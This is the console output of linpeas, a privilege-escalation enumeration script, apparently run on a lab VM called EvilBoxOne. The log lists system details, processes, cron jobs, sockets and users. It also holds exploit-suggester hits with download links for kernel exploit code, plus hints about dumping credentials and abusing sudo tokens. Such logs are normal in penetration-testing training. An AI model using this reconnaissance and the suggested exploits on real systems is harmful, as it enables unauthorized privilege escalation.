         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                               
    |---------------------------------------------------------------------------------|                                               
    |         Follow on Twitter         :     @hacktricks_live                        |                                               
    |         Respect on HTB            :     SirBroccoli                             |                                               
    |---------------------------------------------------------------------------------|                                               
    |                                 Thank you!                                      |                                               
    \---------------------------------------------------------------------------------/                                               
          linpeas-ng by github.com/PEASS-ng                                                                                           
                                                                                                                                      
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                        
                                                                                                                                      
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                              
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                   
                               ╚═══════════════════╝                                                                                  
OS: Linux version 4.19.0-17-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.194-3 (2021-07-18)
User & Groups: uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
Hostname: EvilBoxOne
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                     
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)    
                                                                                                                                      
                                                                                                                                      

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                      
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                    
                              ╚════════════════════╝                                                                                  
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                    
Linux version 4.19.0-17-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.194-3 (2021-07-18)
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

╔══════════╣ Sudo version
sudo Not Found                                                                                                                        
                                                                                                                                      

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                               
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                                              

╔══════════╣ Date & uptime
jue nov 20 19:58:16 CET 2025                                                                                                          
 19:58:16 up 27 min,  1 user,  load average: 0,30, 0,07, 0,02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                  
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                             
UUID=d0c20a19-945b-4f91-8ea2-8466c005b946 /               ext4    errors=remount-ro 0       1                                         
UUID=635c225b-1f26-4d4e-912a-87db360ddbb1 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                               
HISTFILESIZE=0                                                                                                                        
MAIL=/var/mail/mowree
USER=mowree
SSH_CLIENT=192.168.56.52 46712 22
XDG_SESSION_TYPE=tty
SHLVL=1
HOME=/home/mowree
OLDPWD=/home/mowree
SSH_TTY=/dev/pts/0
LOGNAME=mowree
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=2
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
XDG_RUNTIME_DIR=/run/user/1000
LANG=es_ES.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
PWD=/tmp
SSH_CONNECTION=192.168.56.52 46712 192.168.56.37 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                
dmesg Not Found                                                                                                                       
                                                                                                                                      
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                    
[+] [CVE-2019-13272] PTRACE_TRACEME                                                                                                   

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                               
                                                                                                                                      
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                         
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                              
═╣ PaX bins present? .............. PaX Not Found                                                                                     
═╣ Execshield enabled? ............ Execshield Not Found                                                                              
═╣ SELinux enabled? ............... sestatus Not Found                                                                                
═╣ Seccomp enabled? ............... disabled                                                                                          
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (oracle)                                                                                      

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                   
                                   ╚═══════════╝                                                                                      
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                        
╔══════════╣ Container details                                                                                                        
═╣ Is this a container? ........... No                                                                                                
═╣ Any running containers? ........ No                                                                                                
                                                                                                                                      

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                   
                                     ╚═══════╝                                                                                        
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
grep: /etc/cloud/cloud.cfg: No existe el fichero o el directorio
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

./linpeas.sh: 2471: ./linpeas.sh: curl: not found


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                    
                ╚════════════════════════════════════════════════╝                                                                    
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes           
root         1  0.1  0.9 103748  9832 ?        Ss   19:31   0:01 /sbin/init                                                           
root       216  0.0  0.7  20660  7592 ?        Ss   19:31   0:00 /lib/systemd/systemd-journald
root       240  0.0  0.5  22068  5084 ?        Ss   19:31   0:00 /lib/systemd/systemd-udevd
systemd+   249  0.0  0.6  93084  6492 ?        Ssl  19:31   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       324  0.0  0.2   8504  2592 ?        Ss   19:31   0:00 /usr/sbin/cron -f
root       326  0.0  0.7  19392  7316 ?        Ss   19:31   0:00 /lib/systemd/systemd-logind
message+   328  0.0  0.3   8688  3632 ?        Ss   19:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       331  0.0  0.5   9488  5812 ?        Ss   19:31   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
root       332  0.0  0.9 225824  9952 ?        Ssl  19:31   0:00 /usr/sbin/rsyslogd -n -iNONE
root       335  0.0  0.1   5612  1680 tty1     Ss+  19:31   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       377  0.0  0.6  15852  6672 ?        Ss   19:31   0:00 /usr/sbin/sshd -D
mowree     536  0.1  0.4  16600  4860 ?        S    19:51   0:00      _ sshd: mowree@pts/0
mowree     537  0.0  0.4   7784  4516 pts/0    Ss   19:51   0:00          _ -bash
mowree     560  0.5  0.2   3396  2720 pts/0    S+   19:58   0:00              _ /bin/sh ./linpeas.sh
mowree    3276  0.0  0.1   3396  1216 pts/0    S+   19:58   0:00                  _ /bin/sh ./linpeas.sh
mowree    3280  0.0  0.3  10780  3112 pts/0    R+   19:58   0:00                  |   _ ps fauxwww
mowree    3279  0.0  0.1   3396  1216 pts/0    S+   19:58   0:00                  _ /bin/sh ./linpeas.sh
root       412  0.0  1.9 196804 19732 ?        Ss   19:31   0:00 /usr/sbin/apache2 -k start
www-data   415  0.0  0.8 196828  8344 ?        S    19:31   0:00  _ /usr/sbin/apache2 -k start
www-data   416  0.0  0.8 196828  8344 ?        S    19:31   0:00  _ /usr/sbin/apache2 -k start
www-data   417  0.0  0.8 196828  8344 ?        S    19:31   0:00  _ /usr/sbin/apache2 -k start
www-data   418  0.0  0.8 196828  8344 ?        S    19:31   0:00  _ /usr/sbin/apache2 -k start
www-data   419  0.0  0.8 196828  8344 ?        S    19:31   0:00  _ /usr/sbin/apache2 -k start
mowree     527  0.0  0.8  21028  8388 ?        Ss   19:51   0:00 /lib/systemd/systemd --user
mowree     528  0.0  0.2 104712  2224 ?        S    19:51   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                          
                                                                                                                                      
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                             
Proc 249 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                        
Proc 328 with ppid 1 is run by user messagebus but the ppid user is root
Proc 415 with ppid 412 is run by user www-data but the ppid user is root
Proc 416 with ppid 412 is run by user www-data but the ppid user is root
Proc 417 with ppid 412 is run by user www-data but the ppid user is root
Proc 418 with ppid 412 is run by user www-data but the ppid user is root
Proc 419 with ppid 412 is run by user www-data but the ppid user is root
Proc 527 with ppid 1 is run by user mowree but the ppid user is root
Proc 536 with ppid 524 is run by user mowree but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                    
COMMAND    PID TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                              

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                    
gdm-password Not Found                                                                                                                
gnome-keyring-daemon Not Found                                                                                                        
lightdm Not Found                                                                                                                     
vsftpd Not Found                                                                                                                      
apache2 process found (dump creds from memory as root)                                                                                
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                
/usr/bin/crontab                                                                                                                      
incrontab Not Found
-rw-r--r-- 1 root root    1042 oct 11  2019 /etc/crontab                                                                              

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 ago 16  2021 .
drwxr-xr-x 71 root root 4096 ago 16  2021 ..
-rw-r--r--  1 root root  712 dic 17  2018 php
-rw-r--r--  1 root root  102 oct 11  2019 .placeholder

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 ago 16  2021 .
drwxr-xr-x 71 root root 4096 ago 16  2021 ..
-rwxr-xr-x  1 root root  539 ago  8  2020 apache2
-rwxr-xr-x  1 root root 1478 dic  7  2020 apt-compat
-rwxr-xr-x  1 root root  355 dic 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 abr 19  2019 dpkg
-rwxr-xr-x  1 root root  377 ago 29  2018 logrotate
-rwxr-xr-x  1 root root 1123 feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 sep 27  2017 passwd
-rw-r--r--  1 root root  102 oct 11  2019 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 ago 16  2021 .
drwxr-xr-x 71 root root 4096 ago 16  2021 ..
-rw-r--r--  1 root root  102 oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 ago 16  2021 .
drwxr-xr-x 71 root root 4096 ago 16  2021 ..
-rw-r--r--  1 root root  102 oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 ago 16  2021 .
drwxr-xr-x 71 root root 4096 ago 16  2021 ..
-rwxr-xr-x  1 root root  813 feb 10  2019 man-db
-rw-r--r--  1 root root  102 oct 11  2019 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                        
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                     

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                           
You can't write on systemd PATH                                                                                                       

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                             
NEXT                         LEFT         LAST                         PASSED    UNIT                         ACTIVATES               
Thu 2025-11-20 20:09:00 CET  10min left   Thu 2025-11-20 19:39:01 CET  19min ago phpsessionclean.timer        phpsessionclean.service
Fri 2025-11-21 00:00:00 CET  4h 1min left Thu 2025-11-20 06:31:46 CET  13h ago   logrotate.timer              logrotate.service
Fri 2025-11-21 00:00:00 CET  4h 1min left Thu 2025-11-20 06:31:46 CET  13h ago   man-db.timer                 man-db.service
Fri 2025-11-21 04:07:34 CET  8h left      Thu 2025-11-20 06:31:46 CET  13h ago   apt-daily.timer              apt-daily.service
Fri 2025-11-21 06:00:43 CET  10h left     Thu 2025-11-20 06:31:46 CET  13h ago   apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2025-11-21 19:46:05 CET  23h left     Thu 2025-11-20 19:46:05 CET  12min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                             
                                                                                                                                      
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                            
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                                
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                            
/run/dbus/system_bus_socket                                                                                                           
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                              
                                                                                                                                      
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                              
NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION  
:1.0                             249 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
:1.1                               1 systemd         root             :1.1          init.scope                -          -
:1.11                           5401 busctl          mowree           :1.11         session-2.scope           2          -
:1.2                             326 systemd-logind  root             :1.2          systemd-logind.service    -          -
:1.5                             527 systemd         mowree           :1.5          user@1000.service         -          -
org.freedesktop.DBus               1 systemd         root             -             init.scope                -          -
org.freedesktop.hostname1          - -               -                (activatable) -                         -
org.freedesktop.locale1            - -               -                (activatable) -                         -
org.freedesktop.login1           326 systemd-logind  root             :1.2          systemd-logind.service    -          -
org.freedesktop.network1           - -               -                (activatable) -                         -
org.freedesktop.resolve1           - -               -                (activatable) -                         -
org.freedesktop.systemd1           1 systemd         root             :1.1          init.scope                -          -
org.freedesktop.timedate1          - -               -                (activatable) -                         -
org.freedesktop.timesync1        249 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                   
                              ╚═════════════════════╝                                                                                 
╔══════════╣ Hostname, hosts and DNS
EvilBoxOne                                                                                                                            
127.0.0.1       localhost
127.0.1.1       EvilBoxOne

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain home
search home
nameserver 192.168.1.1

╔══════════╣ Interfaces
default         0.0.0.0                                                                                                               
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:14:58:b5 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.37/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 307sec preferred_lft 307sec
    inet6 fe80::a00:27ff:fe14:58b5/64 scope link 
       valid_lft forever preferred_lft forever

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                         
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                            
tcp     LISTEN   0        128                    *:80                  *:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*      

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                    
                                                                                                                                      


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                   
                               ╚═══════════════════╝                                                                                  
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                              
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)        

╔══════════╣ Do I have PGP keys?
gpg Not Found                                                                                                                         
netpgpkeys Not Found                                                                                                                  
netpgp Not Found                                                                                                                      
                                                                                                                                      
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                      
                                                                                                                                      
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                
ptrace protection is disabled (0), so sudo tokens could be abused                                                                     

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                            
                                                                                                                                      
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                       

╔══════════╣ Users with console
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash                                                                                   
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) grupos=0(root)                                                                                                
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
uid=100(_apt) gid=65534(nogroup) grupos=65534(nogroup)
uid=101(systemd-timesync) gid=102(systemd-timesync) grupos=102(systemd-timesync)
uid=102(systemd-network) gid=103(systemd-network) grupos=103(systemd-network)
uid=103(systemd-resolve) gid=104(systemd-resolve) grupos=104(systemd-resolve)
uid=104(messagebus) gid=110(messagebus) grupos=110(messagebus)
uid=105(sshd) gid=65534(nogroup) grupos=65534(nogroup)
uid=10(uucp) gid=10(uucp) grupos=10(uucp)
uid=13(proxy) gid=13(proxy) grupos=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) grupos=1(daemon[0m)
uid=2(bin) gid=2(bin) grupos=2(bin)
uid=33(www-data) gid=33(www-data) grupos=33(www-data)
uid=34(backup) gid=34(backup) grupos=34(backup)
uid=38(list) gid=38(list) grupos=38(list)
uid=39(irc) gid=39(irc) grupos=39(irc)
uid=3(sys) gid=3(sys) grupos=3(sys)
uid=41(gnats) gid=41(gnats) grupos=41(gnats)
uid=4(sync) gid=65534(nogroup) grupos=65534(nogroup)
uid=5(games) gid=60(games) grupos=60(games)
uid=65534(nobody) gid=65534(nogroup) grupos=65534(nogroup)
uid=6(man) gid=12(man) grupos=12(man)
uid=7(lp) gid=7(lp) grupos=7(lp)
uid=8(mail) gid=8(mail) grupos=8(mail)
uid=999(systemd-coredump) gid=999(systemd-coredump) grupos=999(systemd-coredump)
uid=9(news) gid=9(news) grupos=9(news)

╔══════════╣ Login now
 19:58:24 up 27 min,  1 user,  load average: 0,68, 0,15, 0,05                                                                         
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
mowree   pts/0    192.168.56.52    19:51   21.00s  0.26s  0.00s w

╔══════════╣ Last logons
reboot   system boot  Mon Aug 16 12:16:44 2021 - Mon Aug 16 12:58:16 2021  (00:41)     0.0.0.0                                        
root     tty1         Mon Aug 16 11:40:25 2021 - crash                     (00:36)     0.0.0.0
mowree   pts/0        Mon Aug 16 11:36:10 2021 - crash                     (00:40)     192.168.1.75
mowree   pts/0        Mon Aug 16 11:35:30 2021 - Mon Aug 16 11:35:32 2021  (00:00)     192.168.1.75
reboot   system boot  Mon Aug 16 11:34:14 2021 - Mon Aug 16 12:58:16 2021  (01:24)     0.0.0.0
mowree   pts/0        Mon Aug 16 11:19:34 2021 - crash                     (00:14)     192.168.1.75
reboot   system boot  Mon Aug 16 11:19:10 2021 - Mon Aug 16 12:58:16 2021  (01:39)     0.0.0.0
reboot   system boot  Mon Aug 16 11:18:26 2021 - Mon Aug 16 12:58:16 2021  (01:39)     0.0.0.0

wtmp empieza Mon Aug 16 11:18:26 2021

╔══════════╣ Last time logon each user
Nombre           Puerto   De               Último                                                                                     
root             tty1                      lun ago 16 13:12:28 +0200 2021
daemon[0m                                     **Nunca ha accedido**
bin                                        **Nunca ha accedido**
